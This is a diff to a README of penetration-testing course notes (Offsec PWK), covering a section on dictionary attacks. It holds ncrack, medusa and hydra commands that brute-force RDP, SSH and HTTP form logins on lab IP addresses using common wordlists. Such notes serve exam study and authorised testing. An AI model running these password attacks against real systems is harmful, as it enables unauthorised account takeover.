@@ -16,14 +16,15 @@ Offsec PWK notes and frecuently used files.
 </ol>
 
 <h3> 4. Dictionary Attacks </h3> 
-
+<p>
 ncrack -vv --user rax -P wordlist.txt rdp://10.11.0.10
 
 medusa -h 10.11.0.10 -u root -P /usr/share/wordlists/rockyou.txt -e ns -M ssh
 
 hydra -l administrator -P wordlist.txt 192.168.11.201 ssh
 
-hydra $TGT:80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt
+hydra 10.10.10.10 :80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt
+</p>
 
 <h4> Password Generation with cewl and John </h4>
 
